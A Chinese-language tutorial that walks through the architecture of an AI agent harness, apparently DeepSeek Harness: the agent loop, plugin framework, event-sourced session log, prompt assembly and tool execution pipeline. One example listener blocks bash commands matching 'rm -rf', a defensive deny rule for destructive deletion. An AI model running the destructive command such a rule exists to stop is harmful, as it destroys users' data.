假设你会一点命令行、知道什么是 API，但对“agent 到底是怎么跑起来的”没有概念。你不需要会写 TypeScript，也不需要手搓代码。因为这份文档的目标不是让你复现一个 agent，而是让你看一个真实的、工业级的 agent 产品时，知道它在干什么、为什么要这么干、各部分的边界在哪里。

教材是 DeepSeek 开源的 DeepSeek Harness（下称 DSH）。它是一个 agent harness，用大白话说：它把“一个只会聊天的模型”包装成“一个能读你的代码、能跑命令、能开子任务、能记住上次进度、能管住自己别把你硬盘删了”的工具。

选它当教材有三个理由：它是真的有人在用的产品（不是玩具 demo）；它的架构划分异常干净；它把自己的设计文档写进了仓库，你可以对照文档和代码互相验证——这是一种很好的学习习惯。

读的时候有三点约定：

  1. 每节标题下面有一张折叠的「产品经理视角」卡片，点一下才展开。里面是这一节在设计上赌了什么——谁的痛、怎么解、代价是什么、能迁移到你自己项目上的判断。先读正文再看它，收获更大。
  2. 文中的代码块是最小示意，不是可直接编译的完整实现。 目的是让你看清“一行代码对应哪个机制”，真实签名请对照仓库源码（每节都给了路径）。
  3. 关键数字都是实测或读源码得来的，不是估算；唯一例外是那张代码量分布图，它标了统计口径。
术语Harness
马具、挽具。这个词在 AI 工程里指“套在模型外面的那套装置”。模型本身只会输出文字，harness 负责把文字变成动作、把动作的结果喂回去、并保证整个过程中数据不丢、权限不越界。

0 · 先给结论：agent 开发到底在开发什么

产品经理视角先破除误解＋
谁的痛
用户把「模型会思考」当事实，于是误解幻觉、误解循环
怎么解
第一屏就拆掉这个心智模型：模型不循环，循环是程序写的
代价
反直觉，必须马上给证据，否则读者会觉得被冒犯
可迁移
好文档敢先纠正用户的错误前提，而不是顺着说

如果只能记一句话，请记这句：

模型不循环，循环是外面那层程序写的。

你在聊天框里跟模型对话时，感觉它在“思考—行动—再思考”。实际上没有。模型是一个无状态的函数：你给它一段文字（messages），它吐一段文字回来，结束。它不记得上一次、不知道时间、不能读文件、不会自己重试。

所谓 agent，是外面这一层程序反复做同一件事：把“当前该让模型看到的所有东西”拼成一段上下文 → 调模型 → 如果模型说“我要用工具”，就去执行工具、把结果塞进上下文 → 再调一次模型。循环到模型不再要工具为止。

同一句需求，两种命运：

# 裸调模型：它只回一段文字，什么也没做
用户：看看 src/app.ts 为啥报错
模型：建议检查第 42 行是否存在空值。        ← 它没读过那个文件

# 走一遍循环：它真的去看了
用户：看看 src/app.ts 为啥报错
模型：我要调用 read({ path: "src/app.ts" })  ← 这是「意图」，不是答案
harness：执行工具，把文件内容塞回上下文
模型：第 42 行 user 可能为 null，建议加可选链。  ← 这才是答案

区别只在于：多了一个 while 循环，和一套能执行工具的基础设施。

那一个 agent 产品的工程量到底花在哪？我按这个仓库的实际代码量统计了一遍：

看到没有：浏览器界面的代码量，是 agent 内核（core）的十二倍。core 里装着 agent 循环、工具注册表、系统提示词——也就是“agent”这三个字最核心的那部分——但它只占整个代码库的百分之三。

这不是 DSH 的特殊情况，是所有 agent 产品的共性：模型调用那几百行谁都能写，真正吃人力的是它周边的一切——界面怎么把流式内容画出来、状态存在哪、崩了怎么恢复、工具输出太大怎么办、模型跑飞了怎么停、怎么让它别删库、怎么让它开十个子任务又不互相污染。

1 · 地基：LLM 是一个无状态函数

产品经理视角成本与约束＋
谁的痛
用了三个月才发现「它记不住」和「越长越贵」
怎么解
把三条铁律前置成产品约束：无记忆、按量计费、只能追加
代价
把实现细节暴露给使用者，增加认知负担
可迁移
成本模型要写进产品说明，否则用户会以为「越长越聪明」

先把最容易被教程含糊过去的一件事说清楚。

一次模型调用，本质是一次 HTTP 请求：

POST /chat/completions
{
  "model": "deepseek-chat",
  "messages": [ {"role":"system","content":"你是..."},
                {"role":"user","content":"帮我看看这个报错"},
                {"role":"assistant","content":"..."},
                {"role":"tool","content":"..."} ],
  "tools": [ {...工具的 JSON Schema...} ],
  "stream": true
}

它返回的不只是一段文字，而是一串增量片段（stream chunk）：text-delta、tool-call、usage、finish。这一点非常关键——因为“流式”决定了整个产品的交互形态，也决定了 harness 必须一边收一边做事（比如把已经吐出来的字显示给用户，同时准备执行工具）。

由此能推出三条铁律，后面所有设计都是它们的推论：

铁律一 · 没有记忆，只有重发。 模型「记得」上一轮，是因为你把上一轮的内容又发了一遍。日志丢失 = 记忆丢失。

铁律二 · 上下文是唯一的内存，而且按 token 计费。 每次调用都要把全部历史重新发一遍，所以对话越长越贵、越慢。

铁律三 · 历史只能追加，不能修改。 提供方会缓存请求前缀来省钱（KV Cache），你改动中间一段，后面的缓存全部失效。

记住“免费的东西都很贵”——把这三条铁律和成本联系起来，你就能理解后面几乎所有的“奇怪设计”：为什么日志是只追加的、为什么压缩不是删除而是“遮蔽”、为什么系统提示词里的固定部分要放在最前面。

2 · 最小 agent 循环：20 行伪代码

产品经理视角最小可用心智＋
谁的痛
教程一上来就上框架，学完不知道本质是什么
怎么解
先给 20 行伪代码，再往上挂十个子系统
代价
伪代码掩盖了并发、失败、取消这些真问题
可迁移
先给「最小可运行心智模型」，再逐层加复杂度

抛开所有工程细节，一个能跑的 agent 循环长这样：

messages = [system_prompt]

loop:
    回复 = 调用模型(messages, tools=工具清单)

    if 回复里没有工具调用:
        把 回复 追加进 messages
        break                      # 结束：模型认为任务完成了

    把 回复 追加进 messages        # 模型说"我要执行 xxx"
    for 每个工具调用 in 回复.工具调用:
        结果 = 执行工具(名字, 参数)
        把 {role: "tool", 结果} 追加进 messages   # 结果回灌

    continue                       # 带着工具结果，再问模型一次

就这么多。你在 DSH 里能看到的所有复杂性，都是在这 20 行外面加东西。

但请注意这 20 行里已经埋了四个必须回答的问题，而每个问题都会长成一个子系统：

四个问题，就是四个子系统。学 agent 开发，学的就是这四件事各自的标准答案，以及它们之间怎么配合。

术语Turn（轮次）
从“用户说了一句话”到“agent 彻底停下来”，叫一个轮次。
术语Step（步骤）
一次模型请求 + 它引发的工具执行，叫一个步骤。一个轮次里可以有 0 个或多个步骤——0 个的意思是模型一句话没说就把活儿打回来了（比如前置检查没通过）。

把 turn 和 step 分开，是 DSH 一个很值得学的决定：“用户的一次请求”和“模型的一次调用”不是一回事。一个“帮我重构这个模块”的请求，可能包含 40 次模型调用。如果只有“调用”这一层，你就没法回答“这一轮到底花了多少 token”“用户这句话什么时候算完成”。

3 · Harness 到底要补哪十件事

产品经理视角需求排序＋
谁的痛
做出 demo 就以为做出产品，上线第一周就崩
怎么解
不列功能，列「不解决会怎样」——用风险驱动需求
代价
恐惧叙事容易导致过度设计
可迁移
评审时问「不做会怎样」，比问「做了有什么好处」更能筛出真需求

现在可以把“外面那层程序”具体化了。下面这张表就是本文的目录——每一行都是一个真实存在的工程问题，以及 DSH 里对应的模块名（后面的章节逐个展开）。

把那十件事标注回最小循环，你就能看出问题都藏在哪：

msgs = [prompt]
while True:
    r = call_llm(msgs, tools)              # ② 换模型怎么办？流式怎么收？
    msgs.append(r)
    for c in r.tool_calls:                 # ③ 参数谁校验？
        out = run_tool(c)                  # ⑦ 谁允许它跑的？并发几个？
        msgs.append(out)
    save(msgs)                             # ④⑥ 存哪？崩了怎么恢复？
    if len(msgs) > LIMIT: compress(msgs)   # ⑤ 压什么？怎么压？
    if r.done: break

这七行里，几乎每一行都对应一个子系统。“写 agent”就是把这几行写对的过程。

十件事，缺一件这个 agent 就只能算 demo。这就是为什么“写一个能跑 20 次的 agent”和“写一个能连续干两小时活的 agent”完全是两个难度——难点不在模型，在第 4 到第 8 行。

4 · 教材概览：DSH 是个什么样的项目

产品经理视角规模感＋
谁的痛
新人不知道从哪读，随机游走几天就放弃
怎么解
用真实数字（370 包 / 53 万行 / 220 行 YAML）建立量级感
代价
数字会过时，也容易让人望而生畏
可迁移
给新人一张体积地图 + 一条最短路径，比给文档索引有效

先上一组硬数据，让你对“工业级”有个体感：

53 万行不是让你读完的。它的作用是让你知道：一个真正的 agent 产品，能被人反复使用而不崩，靠的是这些代码，不是提示词写得好。

它的设计口号只有一句，写在 README 里：

Everything is a plugin.（一切皆插件）

这句话听起来像营销，但它在这里是字面意思，而且是一个非常硬的技术承诺：模型适配器是插件、工具注册表是插件、会话日志是插件，连 agent 循环本身都是插件。也就是说，产品里没有“不许动的内核”。你想换掉循环、换掉存储、换掉权限策略，方式都是“装一个别的插件在旁边”。

这一条决定了它的目录结构：没有 src/core/ 这种中心化目录，只有 59 个“能力分组”，每个分组下是若干独立可发布的 npm 包。

packages/
  core/        agent / agent-loop / session / tools / system-prompt   ← 骨架
  llm/         模型适配器（deepseek、pi-ai）与流式词汇表
  shell/       bash / pwsh 执行
  fs/          文件读写、搜索、编辑、沙箱围栏
  sandbox/     进程与文件效果限制
  session/     持久化、投影、标题、查询、统计
  compaction/  上下文压缩（压缩器、剪枝、图片卸载）
  subagent/    子代理与委派
  workflow/    脚本化多 agent 编排
  skill/       技能加载
  mcp/         外部工具协议（MCP）
  client/      浏览器端 UI 插件（50+ 个）
  api/         前后端之间的 RPC 控制器
  bundle/      「组装方案」：base / web-app / headless / sdk
  ...

4.1 三十秒看懂一个陌生 monorepo 的三步法

这是我建议你以后拿到任何大型开源项目都先做的三件事，DSH 是个很好的练习对象：

  1. 先看 AGENTS.md 或 CONTRIBUTING.md。 项目作者写给“AI 和自己的新人”看的文件，通常比 README 信息密度高一个数量级。DSH 的 AGENTS.md 里直接写清了每个目录是干什么的、有哪些必须遵守的工程纪律。
  2. 再找“组装入口”。 一个系统跑起来时先加载什么？DSH 的答案是 packages/bundle/*/cordis.patch.yml——一份 YAML，220 行，把 200 多个插件按顺序挂上去。读完它，你就知道这个产品“由什么组成”，这比读任何架构图都准。
  3. 最后挑一条主链路顺下去。 选“用户按回车”这一个动作，从入口一路追到磁盘写盘。这条链路上会经过的每个目录，才是你真正需要读的目录。

前两步各花一小时，能省下你后面几十小时乱翻的时间。

5 · 地基框架 Cordis：五个概念撑起整个项目

产品经理视角可替换性＋
谁的痛
换一个零件要动全身，改 A 崩 B
怎么解
一切皆插件，注册即副作用，依赖自动等待
代价
抽象层多，出问题时调用链不直观
可迁移
插件化的前提是「每个注册都能撤销」，否则就是负债

DSH 不是直接写 TypeScript 应用，而是坐在一个叫 Cordis 的插件框架上。不理解它，你会觉得源码“到处都在注册、却找不到谁在调用”。

Cordis 只有五个概念，先把它们认全（每一行后面的括号是它的英文名）：

术语插件（Plugin）
一个做一件事的模块，比如“提供 bash 工具”。
术语上下文（Context，`ctx`）
所有服务的登记台。一个服务占据一个稳定的名字，比如 ctx.tools、ctx.llm、ctx.sessions。别的插件靠名字找它，而不是 import 它的实现类。
术语inject（依赖声明）
插件说“我需要 ctx.tools 才能启动”。框架负责等你依赖的东西就绪，你不需要手写启动顺序。
术语类型化事件（Typed Event）
插件之间发消息。谁想拦截、观察、改写，就挂一个监听器上去。
术语注册即副作用（Registration is an effect）
你注册的东西，在插件卸载时会自动撤销。不用写 cleanup()。

第五条是这个框架最值钱的地方。

一个最小插件长这样（真实包的结构就是这样，比如 tool-todo）：

export const name = 'tool-todo'
export const inject = ['tools']            // 声明依赖：等 ctx.tools 就绪再启动

export function apply(ctx: Context) {
  ctx.tools.register(defineTool({ /* ... */ }))   // 注册即副作用：卸载时自动撤销
}

没有 new、没有 init()、没有启动顺序表。依赖自动等待，注册自动回收——这就是“一切皆插件”能成立的全部原因。

因为“注册可逆”，才有了后面的热插拔、per-agent 定制、以及“换掉任何一个零件而不动其他人”。

5.1 五种事件分发模式（重点）

这是 Cordis 里最需要花十分钟搞懂的东西，因为它决定了你写的监听器有没有权力拦住别人。

waterfall 是理解 DSH 的钥匙。 它的调用约定是：每个监听器收到参数和最后一个 next 函数。你调用 next()，控制权交给下游；你不调 next() 直接返回，就是短路——下游的人再也看不到这个事件。

// 一个 waterfall 监听器的形状
ctx.on('tools/pre-execute', async (exec, next) => {
  if (该调用是危险操作) return '拒绝：不允许执行'   // 短路，下游看不到
  return next()                                    // 放行，让下游继续判断
})

这就是为什么 DSH 可以在不改循环一行代码的前提下，插进权限检查、审计日志、超时控制、结果改写。“插件而不是改循环” 这条纪律，靠的就是 waterfall。

后面你会反复看到 agent/pre-step、agent/request、tools/pre-execute、tools/execute、tools/post-execute、llm/stream 这些名字——它们全是 waterfall，全部是可插拔的拦截点。

6 · 装配：产品是被一份份 YAML 拼出来的

产品经理视角形态与差异＋
谁的痛
Web 和 CLI 两个形态，逼出满地的 if 分支
怎么解
分层 patch 表达差异，连平台差异也写成配置
代价
patch 整块替换，覆盖时容易误删配置

DSH 的启动过程是“往一张空桌子上按顺序铺桌布”，一层压一层：

空

 ├─ 第二层：bundle（叠加）          ← 如 dsh-web-app，在 base 上加浏览器界面
 ├─ 第三层：profile 的 cordis.patch.yml  ← 你自己的覆盖

= 运行中的产品（一棵插件树）
  • profile：一套有名字的组装方案（web、headless、sdk、acp）。存在 ~/.dsh/profiles/<名字>/ 里。

最容易踩的坑

patch 是「整块替换」而不是「深合并」。你只想改一个字段，也得把想保留的字段全部重述一遍，否则它们会消失。

先把全景看一眼，后面再逐段拆。这是你按回车之后，一个真实 agent 里发生的事情：

01
输入
你打字，消息进入收件箱，唤醒循环
02
组装
打开轮次，拼系统提示词，算这一轮能用哪些工具

把它摊成一条时间轴，就是一次真实轮次的节奏（耗时是示意，真实值取决于模型和网络）：

 0.000s  你按下回车
 0.004s  turn/start        ← 轮次打开
 0.010s  step/start        ← 第 1 步开始

注意 0.130s 和 2.900s 这两条：前者是"信封"被记下来的时刻，后者是"这一步结束"的时刻。没有它们，你事后就没法回答"这次到底用了什么配置、每一步花了多久"。

这七个阶段里有三处最容易出问题，也是 DSH 花最多代码的地方：第 4 步和第 5 步之间的结算（模型说到一半失败怎么办）、第 6 步的上下文膨胀（工具结果动辄几万 token）、第 7 步之后的恢复（进程被杀，能不能接着干）。

8 · 会话日志：整个系统的唯一真相

产品经理视角可解释性＋
谁的痛
出了事故，说不清「模型当时到底看到了什么」
怎么解
模型可见 ⟺ 已记录，用事件溯源把可解释性变成结构约束
代价

可迁移

这是全篇最重要的一章。如果只看一节，看这节。

DSH 的会话不是一个“消息数组”，而是一个只追加的事件日志（append-only event log）。这个模式有个正式名字叫 event sourcing（事件溯源）：不存“当前状态”，只存“发生过的每一件事”，当前状态由事件重放算出来。

一个真实会话在磁盘上长这样（我从自己机器上抓的，路径就是设计文档里写的样子）：

~/.dsh/sessions/
  --home-sakura-my_work-dsh_learn--/          ← 由工作目录生成，让你能按项目找
    9fb9dfe7-b70a-49ff-87f5-b0379f458342/     ← 一个会话一个目录
      session.lock
      session.v4.jsonl.zstd                   ← 当前格式 v4，zstd 压缩

解开之后，第一行是头部（会话身份证）：

{"type":"session","version":4,"id":"9fb9dfe7-...","cwd":"/home/sakura/my_work/dsh_learn",
 "isSeeded":false,"origin":"subagent","delegationDepth":1,"agentPreset":"standard"}

后面每一行是一个事件。下面这几条是真实的（我省略了长字段），你对照着看，就是第 7 章那七个阶段在磁盘上的落地版：

{"type":"turn/start","seq":4,"time":...,"data":{"turn":1}}
{"type":"step/start","seq":6,"time":...,"data":{"turn":1,"step":1}}
{"type":"user/message","seq":9,...,"data":{"role":"user","content":[{"type":"text","text":"..."}]}}
{"type":"request/header","seq":12,...,"data":{"header":{"config":{"provider":"deepseek-official",
   "model":"deepseek-flash","reasoningEffort":"high","maxTokens":256000},"tools":[...]}}}
{"type":"tool/call","seq":17,...,"data":{"turn":1,"step":1,"callId":"call_00_ET_85o...",
   "name":"bash","arguments":"{\"command\": \"ls\", ...}"}}
{"type":"tool/result","seq":20,...,"data":{"turn":1,"step":1,"toolCallId":"call_00_ET_85o...",
   "message":{"role":"tool","content":[{"type":"text","text":"AGENTS.md\nBENCHMARK.md\n..."}]}}}
{"type":"step/end",...}
{"type":"turn/end",...}

几个值得注意的细节：

  • seq 是全局单调递增的序号。所有引用（比如压缩要替换哪一段、这条结果属于哪次调用）都用 seq 定位，不用数组下标。
  • tool/call 的 arguments 是一个 JSON 字符串，不是对象。因为它是模型的原始输出，保留原文才可回放、可审计。
  • 每条事件都带 time。这让“这个任务卡了多久”这种问题能被回答。
  • request/header 单独记一条。因为它可能很大（几十个工具的 JSON Schema），而变化不频繁——把它独立成事件，后续请求只需引用它，日志不至于翻倍。

8.2 一条铁律：模型可见 ⟺ 已记录

AGENTS.md 里有一条工程纪律，原文是 “Model-visible ⟺ logged”：

核心纪律

凡是会进入模型请求的内容，都必须能从会话日志重建。想加一个新的模型可见输入？先加一种会话事件。

这条纪律的威力在于它把“可解释性”变成了结构约束，而不是事后补的日志。任何一次对话，你都能精确回答“当时模型到底看到了什么”——不是“大概看到了什么”。

它还有一个直接好处：回放。DSH 的测试里有一类叫 snapshot test，就是把录好的真实会话日志重放一遍，看输出是否一致。不用花 API 费用，也能回归测试整个循环。

8.3 从日志到上下文：deriveMessages()

模型需要的是一个 messages 数组，日志里存的是事件流。中间这步转换叫 deriveMessages()——把事件投影成消息。

这一步不能简单“全转”。因为：

  1. 有些事件只用于记账（turn/start 不是消息）；
  2. 有些消息被后来的事件遮蔽了（压缩之后旧内容不该再被看见）；
  3. 有些消息要改写（图片被卸载成占位文本）。

所以投影的时候会维护一个叫 surface（表面） 的东西：它记录“当前这一刻，哪些事件构成的序列才是模型该看到的”。压缩不删事件，而是往 surface 上写一条 replace（把 seq 100 到 seq 400 换成一条摘要）——日志永远完整，但模型只看见替换后的版本。

投影在代码里就是两件事：写事件和读消息。

// 写：每个模型可见事实都是一条事件，附带 surface 操作
session.append('user/message', { role: 'user', content: [{ type: 'text', text: '你好' }] },
               { surfaceOp: 'append' })
session.append('tool/result', { /* ... */ }, { surfaceOp: 'append' })

// 读：日志 → 模型能吃的 messages（增量、有缓存）
const messages = session.deriveMessages()

注意 surfaceOp 是必填的：连“追加”都要显式声明，因为将来它可能被换成 replace。这个强制约束就是压缩能安全接管历史的前提。

记住这个机制，第 14 章讲压缩时会回来。

9 · 轮次与步骤：循环的状态机

现在把第 7 章的第 3 到第 5 步拆开看。DSH 的循环（dsh-agent-loop）用一套明确的状态机驱动，不是 while(true) 一把梭。

  │    ├─ 准备调用 prepareCall()（绑定适配器、算默认值）
  │    ├─ 提交系统提示词 + 用户消息到日志
  │    ├─ 记录 request/header
  │    ├─ 冻结请求 → 流式调用模型
  │    │    ├─ assistant/message（成功）
  │    │    └─ assistant/attempt（失败/重试/取消）
  │    ├─ tool/call → tools/pre-execute → tools/execute → tools/post-execute → tool/result
  │    └─ step/end
  ├─ 还有工具要跑？或又来了新输入？→ 回到 step/start
  ├─ agent/turn-stopping  ← 拦截点：临门一脚还能把它拉回来

9.1 为什么要有“请求头（header）”这种奇怪的东西

request/header 记录的不是消息，而是“这次请求的信封”：用哪个 provider、哪个模型、推理强度多少、给了哪些工具。

为什么要单独记？三个原因，每个都很实际：

  1. 省日志空间：工具 schema 可能有几万 token，每个 step 都重存一遍会把日志撑爆。所以只在“信封变了”的时候记一条，其他请求引用最近一条。
  2. 可复现：两年后你还能知道“这次回答是用哪个模型、什么参数生成的”。
  3. 缓存友好：信封不变，提供方的前缀缓存就还能用；信封一变，缓存必然失效。记录信封的变化点，等于记录了“缓存什么时候被清掉”。

9.2 三个容易被忽略的健壮性设计

这部分是“demo”和“产品”的分界线，值得单独讲。

（1）请求是不可变的。 组装好的请求会被深度冻结，再交给适配器。适配器不能偷偷改它。为什么？因为如果适配器能改，那“模型看到的”和“日志记的”就可能不一致——违反 8.2 的铁律。

（2）取消不等于丢弃。 用户点“停止”时，已经流式输出给用户的字必须保留在历史里。否则下一轮模型会以为自己没说过那些话，对话就断了。DSH 的做法是：取消时记一条带 interrupted: true 的 assistant 消息，内容是“已经送达用户的那部分”。

（3）失败的步骤要补结果。 假设模型要调 5 个工具，第 3 个执行到一半进程挂了。下一次请求时，历史里就有 5 个 tool/call 但只有 2 个 tool/result。大多数模型 API 会直接报错（工具调用必须有配对结果）。DSH 的处理是：关步骤之前，给每个没有结果的调用补一条错误结果，并区分两种情况：

  • 有 tool/call 记录但没有结果 → TOOL_OUTCOME_UNKNOWN（“可能已经执行了，副作用不明”）
  • 连 tool/call 都没有 → TOOL_NOT_STARTED（“根本没开始”）

补账的伪代码大致是这样（概念示意）：

for call in 本步骤的每个 tool/call:
    if 已经有 tool/result: continue          # 已提交的结果保持完整
    if 已经派发过:
        append('tool/result', error='TOOL_OUTCOME_UNKNOWN',
               text='它可能已经执行，副作用未知。')
    else:
        append('tool/result', error='TOOL_NOT_STARTED',
               text='还没开始就被中断，可以安全重试。')

这样做的好处：下一次请求的工具历史永远是配对完整的，模型不需要猜“我那个工具到底跑没跑”。

第二种可以放心重试，第一种不行——因为可能已经改了文件/发了请求。「区分没做和不知道做没做」，是可靠系统的基本功。 这个细节在真实产品里极其重要，但在教程里几乎没人讲。

10 · 系统提示词：给模型看的“岗位说明书”

大部分人以为系统提示词就是一段手写文字。在真实产品里，它是一份动态拼装的文档，由十几个模块各自贡献一段，按数值顺序拼起来。

几个设计要点值得学：

（1）顺序是有讲究的。 固定的身份在最前（−1000），部署定制的语气在 0，工具说明居中（1000–5000），“环境事实”（源码路径、Web 入口）放最后（10000+）。原因是稳定在前、易变在后——这样前缀缓存命中率最高（见第 1 章铁律三）。

（2）同名可遮蔽（shadowing）。 一个 agent preset 想换掉部署级的 persona？注册一个同名的 deployment:persona-prefix 就行，最具体的赢。这让“给某个会话换个性格”变成一行配置。

（3）工具说明也是提示词的一部分。 每个工具注册时顺带贡献一段“什么时候该用它”的文字。这就是为什么工具的 description 写得好不好，直接决定模型用得对不对——工具描述不是文档，是 prompt。

加一段提示词就是一次注册，顺序用数字说话：

// 一个工具包贡献自己那段说明；1000 决定它排在哪
ctx.systemPrompt.section({
  name: 'tool:bash',
  order: 1000,
  text: 'Prefer bash for file and process operations.',
})

// 想按 agent 定制？用 agent.ctx 注册同名段即可「遮蔽」全局的
agent.ctx.systemPrompt.section({ name: 'tool:bash', order: 1000, text: '本会话禁用 bash。' })

这就是为什么系统提示词不需要一个“总编辑”：每个模块只管自己那一段，位置由集中分配的数字决定。

10.1 段（section）vs 运行时上下文（context）

这是 DSH 一个非常聪明的区分，也是我建议你在自己项目里照抄的设计：

真实注入的消息长这样（第一行是固定的，后面几条的措辞由各自的贡献方决定，随部署组合而变）：

Current runtime context. This snapshot supersedes earlier runtime-context snapshots.
Current working directory: "/home/sakura/my_work/dsh_learn".
Current DSH file policy: workspace-write. ...
（sandbox 策略、审批策略、子 agent 深度等由各自插件追加）

为什么不能把这些塞进系统提示词？ 因为 cwd 一变，整个系统提示词就变了，缓存全废；而且模型会被反复告知“你现在在 X”，浪费 token。放在末尾的 user 消息里，改了就改了，前面几万 token 的缓存照样命中。

顺带一个反直觉的事实：git 状态不会自动进上下文。DSH 没有任何内置的 git 状态注入，模型想知道分支就得自己跑 bash git status。这是一个刻意的取舍——自动注入会带来“每步刷新”和“污染缓存”的代价，却只在一个场景下有用。

10.2 一个关键决定：系统提示词不走 system 字段

大多数框架把系统提示词放在请求的 system 字段里。DSH 不这么做：它把系统提示词当成会话历史里的第 0 号消息（一条 system/message 事件），请求体里没有 system 字段。

为什么？三个好处：

  1. 可回放：系统提示词也是“模型看到的东西”，按铁律它必须能从日志重建。走事件最自然。
  2. 可替换：压缩想遮蔽旧的提示词？在 surface 上替换那条事件就行。如果它在 system 字段里，压缩没法碰它。
  3. 可演进：改提示词就是追加或替换一条消息，不需要给每种 API 都设计一套“怎么更新 system”的规则。

代价是：要处理“不同模型对 system 消息的位置容忍度不同”——有的模型认最后一条，有的只认第一条。所以 DSH 的适配器要声明一个能力 systemPromptUpdate: 'in-history' | 无，循环据此决定是“原地替换”还是“归并到头部”。这就是“适配器声明能力、循环按能力分支”的典型写法：不是到处 if 判断供应商，而是让适配器自己说“我能怎么更新”。

11.1 一次调用在 wire 上发生什么

适配器内部要做的事比想象的多。以 DeepSeek 适配器为例，它的源码目录里有这些文件：

adapter.ts      适配器实现（注册路由、能力声明）
serialize.ts    把内部消息结构翻译成提供方的 JSON
translate.ts    把提供方的响应翻回内部结构

transport.ts    发请求、超时、重试
model-info.ts   这个模型的上下文窗口、推理强度、价格
files-api.ts    文件上传（有文件 API 的供应商）

必须做的事：把内部 Message[] 翻译成提供方格式（每家都不一样）、把工具 schema 翻译过去、解析流、把“用量/结束原因/错误”归一化回内部词汇。这部分代码通常没人愿意写第二遍，这正是一个 harness 该帮你收掉的工作。

消费方看到的接口只有“一个流”：

for await (const chunk of ctx.llm.stream({
  provider: 'deepseek-official',
  model: 'deepseek-flash',
  messages,
})) {
  if (chunk.type === 'text-delta') process.stdout.write(chunk.text)   // 边收边显示
  if (chunk.type === 'finish') break                                  // 流一定以终态结束
}

循环、压缩器、会话标题生成器用的都是这同一个入口——这就是“缝”的价值：调用方永远只见一套词汇。

11.2 prepareCall()：为什么要“准备”两次

调用模型前有两步，看起来多余，其实是必要分离：

  1. 组装（assemble）：拼系统提示词、算可用工具。
  2. 准备（prepareCall）：绑定适配器、把默认值落定（推理强度、输出上限）、算这个模型的能力（上下文窗口多大、能不能看图）、返回一份冻结的调用配置。

为什么分开？因为组装的结果要能拿去估算压力（决定要不要压缩），而准备的结果要写进日志（请求头）。而且准备阶段要拿模型的元数据——比如“这个模型支持哪些推理强度”，只有适配器知道。所以准备是把“抽象的请求”变成“具体的、可执行、可记录的那一次调用”。

一个工程细节：准备和记录请求头之间，拿的是同一个适配器代次。防止你准备完，适配器被热替换了，结果发出去的和记录的对不上。

12 · 工具：agent 的双手

谁的痛

怎么解
定义即提示词、五段流水线、并发分级、结果两种呈现
代价

工具是 agent 唯一能改变世界的地方。所以工具的设计，直接决定这个 agent 能干什么、会不会搞破坏。

12.1 一个工具的定义长什么样

DSH 用 defineTool() 声明工具，比裸写 JSON Schema 舒服很多：

ctx.tools.register(defineTool({
  name: 'read_file',
  description: 'Read a file from disk.',
  parameters: {
    path: { type: 'string', required: true, description: 'Absolute file path' },
    offset: { type: 'number' },
    limit: { type: 'number' },
  },
  output: {
    schema: { type: 'string' },
    render: (_args, value) => [{ type: 'text', text: value }],
  },
  async execute(args, exec) {
    return readFile(args.path, { encoding: 'utf8', signal: exec.signal })
  },
}))

注意几个设计：

  • parameters 用一套简化 DSL，自动推出 TypeScript 类型：execute(args) 里的 args 是有类型的，写错字段名编译就报错。
  • 执行前会校验模型给的参数：模型幻觉出一个不存在的参数，会被挡在门外，变成一条普通的错误结果——不会让整个轮次崩掉。
  • output 声明输出结构：这样程序化调用方（另一个 agent、工作流）能拿到结构化的值，而不是一段文本再去正则解析。
  • exec.signal：每个工具都能被取消，因为用户随时可能按停止。

12.2 工具有“两种呈现”，但只有一种真相

工具的返回值会经过两层处理：

  1. 规范值（canonical value）：程序可读的结构化数据，给别的程序用。
  2. 渲染内容（projected content）：给模型看的文字/图片，写进会话日志。

为什么要分开？因为给模型看的和给程序看的不该是同一份。模型需要一句人话摘要，程序需要精确字段。混在一起，就会写出“给模型看 JSON、然后祈祷它别解析错”的代码。

12.3 执行流水线：五道关卡

一个工具调用从“模型说要用”到“结果写进日志”，要过五道关。这是全篇最值得抄的一张图：

01
tools/pre-execute
允许 / 拒绝 / 询问；审批只批这一次
02
单调守卫
只拦不放，后面的监听器翻不了案
03
tools/execute
环绕式包装：超时、重试、埋点
04
tools/post-execute
检查、替换、附加上下文
05
finalizeContent
最后的内容不变式，然后写成 tool/result

第 1 道和第 2 道的分工特别精妙。 前者是“可以商量的”（多个监听器可以包装、改写决定，prepend 可以插队）；后者是“不可翻案的”（守卫只能返回拒绝理由或弃权，没有“允许”这个返回值）。所以：

  • 想加一个“危险命令要问人”的策略 → 挂第 1 道
  • 想加一个“不许在没读过文件的情况下改它”的不变式 → 注册守卫

这个区分解决了一个真实痛点：当多个插件都挂权限监听器时，谁都可能把别人的拒绝改成允许。 一旦是“安全不变式”，就必须是不可覆盖的。

想加一条“危险命令要问人”，不用改循环，挂一个监听器就行：

ctx.on('tools/pre-execute', (exec, next) => {
  if (exec.name === 'bash') {
    const { command } = exec.arguments as { command: string }
    if (/\brm\s+-rf\b/.test(command)) return '拒绝：请先确认删除范围'   // 返回理由 = 拒绝
  }
  return next()                                                          // 不返回就放行给下游
}, { prepend: true })

一个函数，就完成了“策略”和“执行”的解耦。这就是第 5 章那个 waterfall 的实战价值。

12.4 并发：为什么结果必须按模型给的顺序

模型一次可能要调 10 个工具。直接 Promise.all 会出两个问题：

  1. 有副作用的操作不能并发（两个 git commit 同时跑试试）。
  2. 结果顺序会乱，模型会困惑（它按自己给的顺序理解结果）。

DSH 的做法：把调用分类成“必须独占的”和“可以并行的”，独占的做屏障（前后不能有别人跑），并行的放进有界滚动池（默认上限 10，可配）。但无论谁先跑完，写进历史的结果永远按模型给的顺序排。

还有一层：执行前会重新分类一次。因为排队期间世界可能变了（工具被卸载、条件工具的条件现在不成立）。这种“排队时的事实，执行时再确认一遍”的习惯，在并发系统里非常常见，也非常容易忘。

13 · 结果回灌：上下文是这样被撑爆的

产品经理视角上下文经济＋
谁的痛
一次工具输出就撑爆窗口，会话直接废掉
怎么解
分层漏斗：工具上限 → spill 有界预览 → compaction 兜底
代价
预览可能丢关键信息，模型要多跑一轮去读
可迁移
「有界但可追溯」永远优于「完整但爆炸」和「截断且丢失」

工具跑完，结果要回到模型眼前。这一步看着简单，其实是整个系统里最容易出事的地方。

一次 bash ls 可能返回 5 万行。 一次抓网页可能 10 万字符。一次跑测试的输出可能是几十万 token。直接塞进上下文，下一轮直接超窗，整个会话报废。

DSH 的处理是多层漏斗：

工具原始输出（可能 10 万 token）
   ↓ ① 工具自己的输出上限（maxOutputChars，截断尾部）
   ↓ ② spill 策略：超过 maxInlineTokens（示例配置 12500）
   ↓        就换成「预览 + 定位信息」，完整内容落到磁盘
   ↓ ③ 后续 compaction 再回头对历史做剪枝
模型的上下文（有界）

